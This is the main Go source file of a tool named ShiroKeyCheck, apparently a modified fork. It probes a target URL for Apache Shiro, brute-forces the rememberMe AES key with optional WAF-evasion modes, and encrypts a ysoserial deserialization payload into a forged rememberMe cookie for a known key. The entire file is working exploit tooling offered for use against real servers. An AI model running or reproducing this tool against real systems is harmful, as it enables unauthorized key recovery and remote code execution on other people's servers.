package main

//CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o ShiroKeyCheckLinux main.go
//CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o ShiroKeyCheck.exe main.go
//go build -ldflags="-s -w" -o ShiroKeyCheck main.go && upx -9 server
import (
	"ShiroKeyCheck/AES_Encrypt"
	"ShiroKeyCheck/Function"
	"ShiroKeyCheck/GlobalVar"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"

	"github.com/briandowns/spinner"
)

func GetCommandArgs() {
	flag.StringVar(&GlobalVar.UserAgent, "ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "User-Agent")
	flag.StringVar(&GlobalVar.Url, "u", "", "目标url（必须）")
	flag.StringVar(&GlobalVar.Method, "m", "GET", "指定请求方法 (默认是 \"GET\")")
	flag.StringVar(&GlobalVar.PostContent, "content", "", "指定当是POST方法时 body里的内容")
	flag.IntVar(&GlobalVar.Timeout, "timeout", 60, "请求超时时间(s) (default 60s)")
	flag.IntVar(&GlobalVar.Interval, "interval", 0, "每个请求的间隔时间(s)")
	flag.StringVar(&GlobalVar.HttpProxy, "proxy", "", "设置http代理 e.g. http://127.0.0.1:8080")
	flag.StringVar(&GlobalVar.Pointkey, "key", "", "指定key进行检测（默认CBC和GCM都会检测）")
	flag.StringVar(&GlobalVar.Aes_mode, "mode", "", "指定加密模块CBC或GCM  (只对-ser参数有效)")
	flag.StringVar(&GlobalVar.SerFile, "ser", "", "payload的字节码文件（可通过ysoserial生成）")
	flag.StringVar(&GlobalVar.Waf, "waf", "", "绕waf方式（u a）")
	flag.Parse()
}

func ShiroCheck() {
	//传进去一个字符串:rememberMe=wotaifu

	if !Function.HttpRequset("1") {
		fmt.Println("使用Shiro")
	} else {
		fmt.Println("没有使用Shiro")
		os.Exit(1)
	}
}
func KeyCheck() {
	Content, _ := base64.StdEncoding.DecodeString(GlobalVar.CheckContent)
	//指定key的检测
	if GlobalVar.Pointkey != "" {
		time.Sleep(time.Duration(GlobalVar.Interval) * time.Second) //设置请求间隔
		if !Function.FindTheKey(GlobalVar.Pointkey, Content, GlobalVar.Waf) {
			fmt.Println("Key is incorrect!")
		}
	} else {
		//检测所有key
		isFind := false
		for i := range GlobalVar.Shirokeys {
			time.Sleep(time.Duration(GlobalVar.Interval) * time.Second) //设置请求间隔
			isFind = Function.FindTheKey(GlobalVar.Shirokeys[i], Content, GlobalVar.Waf)
			if isFind {
				break
			}
		}
		if !isFind {
			fmt.Println("Key not found..")
		}
	}
}
func RememberMeGen() {
	Content, _ := ioutil.ReadFile(GlobalVar.SerFile)
	if GlobalVar.Pointkey == "" {
		fmt.Println("[Error] 必须指定-key参数！")
		os.Exit(1)
	}
	key, _ := base64.StdEncoding.DecodeString(GlobalVar.Pointkey)
	if strings.ToUpper(GlobalVar.Aes_mode) == "CBC" {
		RememberMe := AES_Encrypt.AES_CBC_Encrypt(key, Content) //AES CBC加密
		fmt.Println("[+] rememberMe=", RememberMe)
	} else if strings.ToUpper(GlobalVar.Aes_mode) == "GCM" {
		RememberMe := AES_Encrypt.AES_GCM_Encrypt(key, Content) //AES GCM加密
		fmt.Println("[+] rememberMe=", RememberMe)
	} else {
		fmt.Println("[Error] 请指定正确的加密模式，CBC 或 GCM！(-mode)")
		os.Exit(1)
	}
}
func main() {
	logo()
	//绑定参数
	GetCommandArgs()

	if GlobalVar.SerFile != "" {
		//反序列化，rememberMe字段生成
		RememberMeGen()
	} else {
		if GlobalVar.Url != "" {
			s := spinner.New(spinner.CharSets[35], 100*time.Millisecond, spinner.WithWriter(os.Stderr))
			s.Start()
			ShiroCheck() //检测是否存在shiro
			KeyCheck()   //key的检测
			s.Stop()
		} else {
			flag.Usage()
			fmt.Println("[Error] 必须指定网址。(-url)")
			os.Exit(1)
		}

	}

}
func logo() {
	fmt.Println("        基于https://github.com/myzxcg/ShiroKeyCheck修改而来,再此严重感谢原作者")
	fmt.Println("                  增加两种绕过waf检测KEY的方法 -waf a   -waf u")
	fmt.Println("                ---------------------------------   MrHonest 2022/1/24 02:25")
}
